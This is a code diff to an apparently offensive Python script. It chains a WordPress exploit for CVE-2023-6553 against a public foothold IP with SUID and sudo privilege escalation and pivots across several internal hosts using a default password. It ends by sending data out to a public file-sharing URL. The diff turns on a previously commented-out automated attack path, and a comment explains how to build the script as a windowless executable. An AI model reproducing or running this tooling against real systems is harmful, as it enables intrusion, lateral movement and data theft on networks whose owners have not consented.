@@ -9,7 +9,7 @@ from scp import SCPClient # https://stackoverflow.com/questions/250283/how-to-sc
 
 from wp_exploit.exploit import CVE_2023_6553
 
-public_upload_url = "https://filebin.net/owtgopve6ii7ytuu"
+public_upload_url = "https://filebin.net/randombin/"
 
 # to build: pyinstaller -F --noconsole <python script>
 
@@ -72,7 +72,7 @@ def exploit_wordpress(ip):
     )
     cve_exploit.send_payload(
         cve_exploit.generate_php_filter_payload(delete_command)
-    ) 
+    )
 
     return True
 
@@ -175,53 +175,50 @@ def pivot(ip):
     propagate(ip, "user", password="password")
 
 def main():
-    foothold = "3.15.142.98"
+    foothold = "18.117.91.52"
     public1 = "10.0.15.134"
     db = "10.0.149.227"
     web = "10.0.139.86"
     pc1 = "10.0.137.70"
     pc2 = "10.0.132.76"
     pc3 = "10.0.128.190"
+    attack_path = {
+            public1:[
+                lambda : exploit_suid() or public_privesc(),
+                lambda : pivot(db),
+                ],
+            db:[
+                lambda : exploit_suid() or exploit_sudo(),
+                lambda : pivot(web),
+                ],
+            web:[
+                lambda : exploit_suid() or exploit_sudo(),
+                lambda : pivot(pc1),
+                ],
+            pc1:[
+                lambda : exploit_suid() or exploit_sudo(),
+                lambda : pivot(pc2),
+                ],
+            pc2:[
+                lambda : exploit_suid() or exploit_sudo(),
+                lambda : pivot(pc3),
+                ],
+            pc3:[
+                lambda : exploit_suid() or exploit_sudo(),
+                lambda : exfil() + exit(),
+                ],
+            }
 
-    exploit_wordpress(foothold)
+    # TODO: sleep for 30 sec between each stage
+    if "init" in sys.argv:
+        exploit_wordpress(foothold)
 
-    # attack_path = {
-    #         public1:[
-    #             lambda : exploit_suid() or public_privesc(),
-    #             lambda : pivot(db),
-    #             ],
-    #         db:[
-    #             lambda : exploit_suid() or exploit_sudo(),
-    #             lambda : pivot(web),
-    #             ],
-    #         web:[
-    #             lambda : exploit_suid() or exploit_sudo(),
-    #             lambda : pivot(pc1),
-    #             ],
-    #         pc1:[
-    #             lambda : exploit_suid() or exploit_sudo(),
-    #             lambda : pivot(pc2),
-    #             ],
-    #         pc2:[
-    #             lambda : exploit_suid() or exploit_sudo(),
-    #             lambda : pivot(pc3),
-    #             ],
-    #         pc3:[
-    #             lambda : exploit_suid() or exploit_sudo(),
-    #             lambda : exfil() + exit(),
-    #             ],
-    #         }
+    exploits = attack_path[current_ip()]
+    propagated = False
+    if current_user() != "root":
+        propagated = exploits[0]()
+    if not propagated:
+        exploits[1]()
 
-    # # TODO: sleep for 30 sec between each stage
-    # if "init" in sys.argv:
-    #     exploit_wordpress(foothold)
-    #     return
-
-    # exploits = attack_path[current_ip()]
-    # propagated = False
-    # if current_user() != "root":
-    #     propagated = exploits[0]()
-    # if not propagated:
-    #     exploits[1]()
-
-main()
+if __name__ == "__main__":
+    main()
